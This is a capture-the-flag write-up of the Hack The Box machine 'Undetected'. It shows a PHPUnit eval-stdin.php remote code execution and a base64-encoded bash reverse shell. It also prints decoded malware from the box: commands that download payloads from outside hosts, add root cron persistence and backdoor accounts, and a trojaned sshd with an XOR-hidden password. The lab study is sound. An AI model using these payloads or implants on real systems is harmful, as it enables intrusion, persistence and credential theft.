# Undetected HTB | 0xwerz | 03/02/22 
### The official [box page](https://app.hackthebox.com/machines/Undetected) on HTB 

<p align="center">
<img src="./img/Undetected.png" alt="pandora poster" width="500"/>
</p>


### The writeup:
#### System Scan | **IP: 10.10.11.146**
let's add the ip to to the `/etc/hosts` file and name it `undetected.htb`
> `echo '10.10.11.146    undetected.htb ' >> /etc/hosts`


startup nmap scan | **-sC for the default set of scripts**. | **-sV for Enables version detection**. | **-T4 for sending the traffic fast**.
>`nmap -sC -sV -T4 10.10.11.146`

```
werz@ctf01:~/ctf/htb/undetected$ nmap -sC -sV -T4 10.10.11.146 2>/dev/null
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-06 02:41 +01
Nmap scan report for 10.10.11.146
Host is up (0.29s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Diana's Jewelry

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.26 seconds
```
## Open Ports
|Ports|Service|Takeaways|
|------|-----|-----|
|22|SSH| OpenSSH 8.2 (protocol 2.0)|
|80|HTTP| Apache httpd 2.4.41|

#### Enumeration | Web page

after a while we'll see the store subdomain `store.djewelry.htb` in the page header href links. add it the hosts file
```bash
echo '10.10.11.146    store.djewelry.htb ' >> /etc/hosts
```

fire up gobuster may we'll get some interesting endpoints

```bash
gobuster dir -u http://store.djewelry.htb/ -w ~/opt/seclists/SecLists/Discovery/Web-Content/raft-small-words.txt
```

we see the vendor `/vendor` endpoint, seems to have interesting stuff, including `/vendor/composer/installed.json`, which could give information about what plugins are in use. composer is a PHP package management system.

```bash
werz@Arch:~/ctf/htb/undetected$ curl -s 'http://store.djewelry.htb/vendor/composer/installed.json' | jq -c '.[] | [.name, .version]'
["doctrine/instantiator","1.4.0"]
["myclabs/deep-copy","1.10.2"]
["phpdocumentor/reflection-common","2.2.0"]
["phpdocumentor/reflection-docblock","5.2.2"]
["phpdocumentor/type-resolver","1.4.0"]
["phpspec/prophecy","v1.10.3"]
["phpunit/php-code-coverage","4.0.8"]
["phpunit/php-file-iterator","1.4.5"]
["phpunit/php-text-template","1.2.1"]
["phpunit/php-timer","1.0.9"]
["phpunit/php-token-stream","2.0.2"]
["phpunit/phpunit","5.6.2"]
["phpunit/phpunit-mock-objects","3.4.4"]
["sebastian/code-unit-reverse-lookup","1.0.2"]
["sebastian/comparator","1.2.4"]
["sebastian/diff","1.4.3"]
["sebastian/environment","2.0.0"]
["sebastian/exporter","1.2.2"]
["sebastian/global-state","1.1.1"]
["sebastian/object-enumerator","1.0.0"]
["sebastian/recursion-context","1.0.5"]
["sebastian/resource-operations","1.0.0"]
["sebastian/version","2.0.1"]
["symfony/polyfill-ctype","v1.23.0"]
["symfony/yaml","v3.4.47"]
["webmozart/assert","1.10.0"]
```
## Shell as www-data

moving throught the list to find some exploits with google, ends up with the `phpunit` that have a [exploit-db](https://www.exploit-db.com/exploits/5070) RCE, that aims to the `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` that also exists with the box. this probably passing a php code to eval that execute it.

```bash
[werz@Arch undetected]$ curl 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php echo hello ?>'
hello
```
it works well! let's get a shell then.

```bash
[werz@Arch undetected]$ echo "bash -i >& /dev/tcp/10.10.14.9/9001 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzkwMDEgMD4mMQo=

[werz@Arch undetected]$ export rev=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzkwMDEgMD4mMQo=

[werz@Arch undetected]$ curl 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system("echo '"$rev"'|base64 -d |bash"); ?>'
```

for the listener side we got a hit!
```bash
werz@Arch undetected]$ nc -lvnp 9001
Connection from 10.10.11.146:48018
bash: cannot set terminal process group (895): Inappropriate ioctl for device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$
```
i'll upgrade the shell:

```bash
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ export TERM=xterm
```

## Shell as steven | PE

### Enumeration

after some manual enumeration we've found the `/var/backups` directory that has an unusual ELF file in it `info` , Everything else there is owned by root except it that owned by ` www-data` so we have access to it.

```bash
www-data@production:/var/backups$ ls -l
total 64
-rw-r--r-- 1 root     root     34011 Feb  8 19:05 apt.extended_states.0
-r-x------ 1 www-data www-data 27296 May 14  2021 info

www-data@production:/var/backups$ file info
info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped
```
executing it:
```
www-data@production:/var/backups$ ./info
[.] starting
[.] namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
[-] substring 'ffff' not found in dmesg
```
it's probally a failed kernel exploit

I’ll copy the file into a website endpoint `/var/www/main/images/` to analyse it:

```bash
www-data@production:/var/backups$ cp info /var/www/main
```

```bash
[werz@Arch user]$ curl undetected.htb/info -O info
```
if we run the `strings` command for it dumps some interesting stuff,`/bin/bash` after that some hexadecimal 
```bash
[werz@Arch user]$ strings info 
```
```bash
[-] substring '%s' not found in dmesg
ffff
/bin/bash
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
[-] fork()
/etc/shadow
[.] checking if we got root
```
if we convert the hex to text, we see a bash script [gchq](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=Nzc2NzY1NzQyMDc0NjU2ZDcwNjY2OTZjNjU3MzJlNzg3OTdhMmY2MTc1NzQ2ODZmNzI2OTdhNjU2NDVmNmI2NTc5NzMyMDJkNGYyMDJmNzI2ZjZmNzQyZjJlNzM3MzY4MmY2MTc1NzQ2ODZmNzI2OTdhNjU2NDVmNmI2NTc5NzMzYjIwNzc2NzY1NzQyMDc0NjU2ZDcwNjY2OTZjNjU3MzJlNzg3OTdhMmYyZTZkNjE2OTZlMjAyZDRmMjAyZjc2NjE3MjJmNmM2OTYyMmYyZTZkNjE2OTZlM2IyMDYzNjg2ZDZmNjQyMDM3MzUzNTIwMmY3NjYxNzIyZjZjNjk2MjJmMmU2ZDYxNjk2ZTNiMjA2NTYzNjg2ZjIwMjIyYTIwMzMyMDJhMjAyYTIwMmEyMDcyNmY2Zjc0MjAyZjc2NjE3MjJmNmM2OTYyMmYyZTZkNjE2OTZlMjIyMDNlM2UyMDJmNjU3NDYzMmY2MzcyNmY2ZTc0NjE2MjNiMjA2MTc3NmIyMDJkNDYyMjNhMjIyMDI3MjQzNzIwM2QzZDIwMjIyZjYyNjk2ZTJmNjI2MTczNjgyMjIwMjYyNjIwMjQzMzIwM2UzZDIwMzEzMDMwMzAyMDdiNzM3OTczNzQ2NTZkMjgyMjY1NjM2ODZmMjAyMjI0MzEyMjMxM2E1YzI0MzY1YzI0N2E1MzM3Nzk2YjQ4NjY0NjRkNjczMzYxNTk2ODc0MzQ1YzI0MzE0OTU1NzI2ODVhNjE2ZTUyNzU0NDVhNjg2NjMxNmY0OTY0NmU2ZjRmNzY1ODZmNmY2YzRiNmQ2Yzc3NjI2YjY1Njc0MjU4NmIyZTU2NzQ0NzY3MzczODY1NGMzNzU3NDI0ZDM2NGY3MjRlNzQ0NzYyNWE3ODRiNDI3NDUwNzUzODU1NjY2ZDM5Njg0ZDMwNTIyZjQyNGM2NDQxNDM2ZjUxMzA1NDM5NmUyZjNhMzEzODM4MzEzMzNhMzAzYTM5MzkzOTM5MzkzYTM3M2EzYTNhMjAzZTNlMjAyZjY1NzQ2MzJmNzM2ODYxNjQ2Zjc3MjIyOTdkMjcyMDJmNjU3NDYzMmY3MDYxNzM3Mzc3NjQzYjIwNjE3NzZiMjAyZDQ2MjIzYTIyMjAyNzI0MzcyMDNkM2QyMDIyMmY2MjY5NmUyZjYyNjE3MzY4MjIyMDI2MjYyMDI0MzMyMDNlM2QyMDMxMzAzMDMwMjA3YjczNzk3Mzc0NjU2ZDI4MjI2NTYzNjg2ZjIwMjIyNDMxMjIyMDIyMjQzMzIyMjAyMjI0MzYyMjIwMjIyNDM3MjIyMDNlMjA3NTczNjU3MjczMmU3NDc4NzQyMjI5N2QyNzIwMmY2NTc0NjMyZjcwNjE3MzczNzc2NDNiMjA3NzY4Njk2YzY1MjA3MjY1NjE2NDIwMmQ3MjIwNzU3MzY1NzIyMDY3NzI2Zjc1NzAyMDY4NmY2ZDY1MjA3MzY4NjU2YzZjMjA1ZjNiMjA2NDZmMjA2NTYzNjg2ZjIwMjIyNDc1NzM2NTcyMjIzMTIyM2E3ODNhMjQ2NzcyNmY3NTcwM2EyNDY3NzI2Zjc1NzAzYTJjMmMyYzNhMjQ2ODZmNmQ2NTNhMjQ3MzY4NjU2YzZjMjIyMDNlM2UyMDJmNjU3NDYzMmY3MDYxNzM3Mzc3NjQzYjIwNjQ2ZjZlNjUyMDNjMjA3NTczNjU3MjczMmU3NDc4NzQzYjIwNzI2ZDIwNzU3MzY1NzI3MzJlNzQ3ODc0M2I)

```bash
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```

it seems that it have a scenario of a already hacked machine, it makes sense if we checked the users available.

```
steven@production:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
```
it a common attack way.

let's try to crack the hash given in that bash script, i'm using [john](https://github.com/openwall/john) with the rockyou word list. 


```bash
[werz@Arch user]$ echo '$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/' > hash
[werz@Arch user]$ john --wordlist=/home/werz/opt/rockyou.txt hash

Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (?)
1g 0:00:00:27 DONE (2022-07-07 07:19) 0.03696g/s 3293p/s 3293c/s 3293C/s littlebird..hairy
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

well, the password is `ihatehackers` let's get a shell!

the password will work for `steven1` since they have the same UID, it will give a shell as steven, this is the concept of that binary file attack.
```bash
www-data@production:/var/backups$ su steven1
Password: ihatehackers
steven@production:/var/backups$ 
```
we also can get a ssh shell.


## Shell as root | PE

There is mail in `/var/mail/steven`

```bash
steven@production:~$ cat /var/mail/steven 
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
	by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
	for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
	by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
	Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
steven@production:~$
```

we can look for files that created around the `info` file date. 14 May 2021
```
steven@production:/var/backups$ ls -l info
-r-x------ 1 www-data www-data 27296 May 14  2021 info
steven@production:/var/backups$
```
I filtered the `/usr/share` path because it has none interesting bunch of files.
```bash
steven@production:~$ find / -newermt 2021-05-14 ! -newermt 2021-05-20 -ls 2>/dev/null | grep -v "/usr/share"
      198   1264 -rw-r--r--   1 root     root      1293928 May 19  2021 /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
      383      0 lrwxrwxrwx   1 root     root           15 May 19  2021 /usr/lib/x86_64-linux-gnu/libX11.so.6 -> libX11.so.6.3.0
     2050     36 -rw-r--r--   1 root     root        34800 May 17  2021 /usr/lib/apache2/modules/mod_reader.so
    17565     28 -r-x------   1 www-data www-data    27296 May 14  2021 /var/backups/info
   136479      4 -rw-r--r--   1 root     root           73 May 19  2021 /var/lib/dpkg/info/libx11-6:amd64.triggers
   135874     16 -rw-r--r--   1 root     root        14532 May 19  2021 /var/lib/dpkg/info/libx11-data.md5sums
   141686      4 -rw-r--r--   1 root     root           43 May 14  2021 /var/lib/dpkg/info/update-notifier-common.triggers
   136056      4 -rw-r--r--   1 root     root           73 May 19  2021 /var/lib/dpkg/info/libx11-6:amd64.shlibs
   136215     32 -rw-r--r--   1 root     root        32605 May 19  2021 /var/lib/dpkg/info/libx11-6:amd64.symbols
   136055      4 -rw-r--r--   1 root     root          427 May 19  2021 /var/lib/dpkg/info/libx11-6:amd64.md5sums
    50834      4 -rw-r--r--   1 root     root           69 May 17  2021 /etc/apache2/mods-available/reader.load
    50832      0 lrwxrwxrwx   1 root     root           29 May 17  2021 /etc/apache2/mods-enabled/reader.load -> ../mods-available/reader.load
```

The file in `/etc/apache2/mods-available` aims back to the `mod_reader.so` that also modified on 17 may.
I'll copy it into my machine for analysing it

`strings` also helps this time no need to use a decompiler lol,

just take a quick look at the results you'll see a familiar base64
```bash
[werz@Arch root]$ strings mod_reader.so
```
```bash
[]A\A]
D$(1
D$(dH+
reader
/bin/bash
mod_reader.c
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
;*3$"
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
42PA
GCC: (Debian 10.2.1-6) 10.2.1 20210110
```

```bash
[werz@Arch root]$ echo 'd2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk' | base64 -d
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
```

So It’s getting a sshd binary let's pull a copy as well.

I'll use [ghidra](https://github.com/NationalSecurityAgency/ghidra) for reversing the binary

if we look at the exports functions we see a lot of function that start with `auth_`

![auth](/img/auth_functions.png)

The `auth_password` function seems a good place to start with. let's take a look.



There’s a variable called backdoor, checking the official source code for that function [here](https://github.com/openssh/openssh-portable/blob/master/auth-passwd.c) we can see that has been changed.

I won't go in to the details of it work in short:
the variable is createdwith 31 bytes, then hex values in little endian format are stored in it and then XORed by `0x96` key length, Then the password is compared to that value, and if so the return value is set to one, and the rest of the function is skipped.

```c
int auth_password(ssh *ssh,char *password)

{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  size_t sVar6;
  byte bVar7;
  int iVar8;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long local_30;
  
  bVar7 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar8 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
  pbVar4 = (byte *)backdoor;
  while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
  iVar2 = strcmp(password,backdoor);
  uVar3 = 1;
  if (iVar2 != 0) {
    sVar6 = strlen(password);
    uVar3 = 0;
    if (sVar6 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar8 = 0;
      }
      if ((*password != '\0') ||
         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        uVar3 = (uint)(iVar2 != 0 && iVar8 != 0);
      }
    }
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
### Decoding root password
> A note, backdoor[30] is an invalid value of -0x5b, if you right click it in Ghidra you’ll see the correct value is 0xa5.


we need to decode the password that held by the backdoor variable, we can use a simple python loop script or even easier with [CyberChef](https://gchq.github.io/CyberChef/)


![pwd_decode](/img/pwd_decode.png)

So just like the function we’ve taken the values of backdoor, then converted from Little Endian to Hex and then XOR’d it. The result is the root password. 

template: [gchq](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg)

```bash
[werz@Arch root]$ ssh root@10.10.11.146
root@10.10.11.146's password: 
Last login: Thu Jul  7 08:48:09 2022 from 10.10.14.9
root@production:~# 
```

We are in!